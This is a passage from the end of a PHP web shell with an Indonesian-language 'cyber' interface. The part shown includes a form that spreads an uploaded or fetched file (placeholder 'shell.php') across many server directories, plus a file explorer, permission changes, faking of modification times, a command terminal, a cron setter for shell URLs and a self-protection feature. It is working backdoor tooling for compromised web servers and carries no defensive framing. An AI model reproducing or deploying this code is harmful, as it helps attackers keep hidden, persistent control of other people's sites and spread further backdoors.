                                            <?php endforeach; ?>
                                        </select>
                                    </div>
                                    <input type="text" name="target_dir" id="target_dir" class="w-full mt-2" value="<?= htmlspecialchars($targetDirInputForForm) ?>" required>
                                </fieldset>

                                <p class="text-center cyber-font">- ATAU -</p>

                                <fieldset class="cyber-panel p-4">
                                    <legend class="cyber-font" style="color:var(--accent)">2. Pilih Sumber File (Pilih Salah Satu)</legend>
                                    
                                    <div>
                                        <label for="file">A. Upload File:</label>
                                        <input type="file" name="file" id="file" class="w-full mt-1">
                                    </div>

                                    <div>
                                        <label for="github_url">B. Dari URL GitHub Raw:</label>
                                        <input type="url" name="github_url" id="github_url" class="w-full mt-1" placeholder="https://raw.githubusercontent.com/..." value="<?= htmlspecialchars($githubUrlInputForForm) ?>">
                                    </div>
                                    
                                    <div>
                                        <label>C. Dari Konten Mentah:</label>
                                        <input type="text" name="raw_filename" class="w-full mt-1 mb-2" placeholder="Nama file (e.g., shell.php)" value="<?= htmlspecialchars($rawFilenameForForm) ?>">
                                        <textarea name="raw_content" class="w-full h-32" placeholder="&lt;?php ... ?&gt;"><?= htmlspecialchars($rawContentForForm) ?></textarea>
                                    </div>
                                </fieldset>

                                <button type="submit" class="cyber-btn cyber-btn-primary w-full"><i class="fas fa-satellite-dish mr-2"></i>Mulai Sebar File</button>
                            </form>

                            <?php if (!empty($results)): ?>
                            <div class="mt-6">
                                <h2 class="cyber-font cyber-glow text-lg mb-2">Lokasi Berhasil Disebar:</h2>
                                <textarea readonly class="w-full h-64 bg-black text-green-400 p-2"><?= htmlspecialchars(implode("\n", $results)) ?></textarea>
                            </div>
                            <?php endif; ?>
                        </section>
                    <?php
                    } else {
                        echo '<section class="cyber-panel p-4"><h1 class="cyber-font cyber-glow">Halaman Tidak Ditemukan</h1><p>Pilih menu yang valid dari sidebar kiri.</p></section>';
                    }
                    ?>
                </div>
            </div>
        </main>
    </div>
    
    <div id="create-modal" class="modal"><div class="modal-content"><span class="close-btn absolute top-2 right-4 text-2xl cursor-pointer hover:text-white">&times;</span><h2 id="modal-title" class="cyber-font cyber-glow text-lg mb-4"></h2><form method="POST" action="<?= $htmlspecialchars_fn($_SERVER['REQUEST_URI']); ?>"><input type="hidden" name="action" value="create_new_item"><div id="modal-input-container"></div><button type="submit" class="cyber-btn cyber-btn-primary mt-4">Submit</button></form></div></div>
    <form method="post" id="chmod-form" style="display:none;"><input type="hidden" name="action" value="change_chmod"><input type="hidden" name="target" id="chmod-target"><input type="hidden" name="new_perms" id="chmod-new-perms"></form>
    <form method="post" id="mtime-form" style="display:none;"><input type="hidden" name="action" value="change_mtime"><input type="hidden" name="target" id="mtime-target"><input type="hidden" name="new_mtime" id="mtime-new-val"></form>

    <script>
        function setShellUrlForCron(selectedUrl) { document.getElementById('url_cron_input').value = selectedUrl; }
        function confirmDelete(itemName) { return confirm("Yakin hapus '" + itemName + "'? Aksi ini TIDAK DAPAT dibatalkan."); }
        function renameItem(currentPath, currentNameEncoded, currentNameDisplay) { var newName = prompt("Nama baru untuk '" + currentNameDisplay + "':", currentNameDisplay); if (newName && newName.trim() !== "" && newName !== currentNameDisplay) { if (newName.includes('/') || newName.includes('\\') || newName === "." || newName === "..") { alert("Nama baru tidak valid."); return; } window.location.href = "?menu=explorer&path=" + currentPath + "&file_action=rename&target=" + currentNameEncoded + "&new_name=" + encodeURIComponent(newName.trim()); } }
        function changePerms(targetName, currentPerms) { var newPerms = prompt("Izin baru untuk '" + decodeURIComponent(targetName) + "' (e.g., 0755 atau 0777):", currentPerms); if (newPerms && newPerms.trim() !== "" && newPerms !== currentPerms) { if (!/^[0-7]{3,4}$/.test(newPerms.trim())) { alert("Format izin tidak valid."); return; } $('#chmod-target').val(targetName); $('#chmod-new-perms').val(newPerms.trim()); $('#chmod-form').attr('action', '?menu=explorer&path=<?= urlencode($current_path); ?>').submit(); } }
        function changeMtime(targetName, currentMtime) { var newMtime = prompt("Waktu modifikasi baru untuk '" + decodeURIComponent(targetName) + "' (YYYY-MM-DD HH:MM:SS):", currentMtime); if (newMtime && newMtime.trim() !== "" && newMtime !== currentMtime) { $('#mtime-target').val(targetName); $('#mtime-new-val').val(newMtime.trim()); $('#mtime-form').attr('action', '?menu=explorer&path=<?= urlencode($current_path); ?>').submit(); } }
        
        document.addEventListener('DOMContentLoaded', function() {
            var editorTextArea = document.getElementById('code-editor');
            if(editorTextArea) {
                var editor = CodeMirror.fromTextArea(editorTextArea, {
                    lineNumbers: true, mode: 'php', theme: 'ayu-mirage', lineWrapping: true,
                    smartIndent: true, indentUnit: 4, tabSize: 4, indentWithTabs: false,
                    autoCloseBrackets: true, matchBrackets: true
                });

                <?php if ($active_menu === 'editor' && isset($_GET['target'])): ?>
                var fileName = <?= json_encode(strtolower(call_user_func($basename_fn, $_GET['target']))); ?>;
                var fileExtension = fileName.split('.').pop();
                var modeMap = {
                    'js': 'javascript', 'json': 'application/json', 'xml': 'xml', 'html': 'htmlmixed', 'css': 'css',
                    'php': 'php', 'phtml': 'php', 'php3': 'php', 'php4': 'php', 'php5': 'php', 'php7': 'php', 'phps': 'php', 'pht': 'php'
                };
                if (modeMap[fileExtension]) { editor.setOption("mode", modeMap[fileExtension]); }
                <?php endif; ?>
            }

            var terminalBox = document.getElementById("terminalBox");
            if(terminalBox) terminalBox.scrollTop = terminalBox.scrollHeight;
            var cmdInput = document.getElementById("cmd_input");
            if(cmdInput) cmdInput.focus();

            $('#select-all-checkbox').on('change', function() { $('.item-checkbox').prop('checked', $(this).is(':checked')); });

            $('#bulk-action-form').on('submit', function(e) { const op = this.elements.bulk_operation.value; const selected = $('.item-checkbox:checked').length; if (op === "") { alert("Pilih aksi."); e.preventDefault(); return; } if (selected === 0) { alert("Tidak ada item yang dipilih."); e.preventDefault(); } if (op === 'delete' && !confirm("Yakin hapus " + selected + " item?")) e.preventDefault(); });
            
            var modal = $("#create-modal"); var btnFile = $("#create-file-btn"); var btnFolder = $("#create-folder-btn");
            btnFile.on('click', function() { $("#modal-title").html("Buat File Baru"); $("#modal-input-container").html('<label for="new_file_name">Nama File:</label><input type="text" id="new_file_name_modal_input" name="new_file_name" required autofocus class="w-full">'); modal.show(); $('#new_file_name_modal_input').focus(); });
            btnFolder.on('click', function() { $("#modal-title").html("Buat Folder Baru"); $("#modal-input-container").html('<label for="new_folder_name">Nama Folder:</label><input type="text" id="new_folder_name_modal_input" name="new_folder_name" required autofocus class="w-full">'); modal.show(); $('#new_folder_name_modal_input').focus(); });
            modal.on('click', '.close-btn', function() { modal.hide(); });
            $(window).on('click', function(event) { if ($(event.target).is(modal)) modal.hide(); });

            $('#file-upload-input').on('change', function() { 
                const files = this.files;
                if (files.length > 1) { $('#file-upload-filename').text(files.length + ' files selected.'); } 
                else if (files.length === 1) { $('#file-upload-filename').text(files[0].name); } 
                else { $('#file-upload-filename').text('No file selected.'); }
            });

            // --- Dynamic Cache/Protector Logic ---
            const protectorRowsContainer = $('#protector-rows');
            function addProtectorRow() {
                const template = $('#protector-row-template').html();
                protectorRowsContainer.append(template);
                if (protectorRowsContainer.children().length === 1) {
                    const firstRowInput = protectorRowsContainer.find('.protector-row:first .target-path-input');
                    if (firstRowInput.val() === '' || firstRowInput.attr('placeholder') === firstRowInput.val()) {
                        firstRowInput.val('<?= $htmlspecialchars_fn(basename(__FILE__)); ?>');
                    }
                }
            }
            $('#add-protector-row').on('click', addProtectorRow);
            protectorRowsContainer.on('click', '.remove-row', function() {
                $(this).closest('.protector-row').remove();
            });
            if (protectorRowsContainer.length && protectorRowsContainer.children().length === 0) {
                addProtectorRow();
            }

            const passwordInputLogin = document.querySelector('.login-box input[type="password"]');
            if (passwordInputLogin) { passwordInputLogin.focus(); }
        });
    </script>
</body>
</html>
<?php
ob_end_flush();
?>
